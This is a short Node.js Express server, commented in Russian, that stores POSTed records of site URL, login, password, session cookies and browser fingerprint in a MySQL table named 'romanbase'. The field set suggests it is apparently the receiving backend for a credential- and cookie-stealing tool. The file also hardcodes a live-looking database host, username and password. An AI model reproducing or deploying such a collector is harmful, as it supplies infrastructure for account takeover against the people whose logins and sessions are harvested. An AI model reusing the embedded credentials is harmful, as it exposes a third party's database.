const express = require('express');
const mysql = require('mysql2');

const app = express();
const port = process.env.PORT || 3000;

// Подключение к MySQL
const connection = mysql.createConnection({
  host: 'srv862.hstgr.io',
  user: 'u209688098_pomoh',
  password: '14121990Pomoh',
  database: 'u209688098_finger',
});

// Middleware для обработки JSON-запросов
app.use(express.json());

// Создание таблицы, если её нет
connection.query(`
  CREATE TABLE IF NOT EXISTS romanbase (
    id INT AUTO_INCREMENT PRIMARY KEY,
    url VARCHAR(255),
    login VARCHAR(255),
    password VARCHAR(255),
    cookies TEXT,
    fingerprint VARCHAR(255)
  )
`, (err) => {
  if (err) {
    console.error('Ошибка создания таблицы:', err);
  } else {
    console.log('Таблица создана успешно');
  }
});

// Обработка POST-запроса для сохранения данных в базе данных
app.post('/api/users', (req, res) => {
  const { url, login, password, cookies, fingerprint } = req.body;

  // Вставка данных в таблицу
  connection.query(
    'INSERT INTO romanbase (url, login, password, cookies, fingerprint) VALUES (?, ?, ?, ?, ?)',
    [url, login, password, cookies, fingerprint],
    (err, results) => {
      if (err) {
        console.error('Ошибка при вставке данных:', err);
        res.status(500).json({ error: 'Ошибка сервера' });
      } else {
        console.log('Данные успешно сохранены');
        res.json({ message: 'Данные успешно сохранены', entryId: results.insertId });
      }
    }
  );
});

// Запуск сервера
app.listen(port, () => {
  console.log(`Сервер запущен на порту ${port}`);
});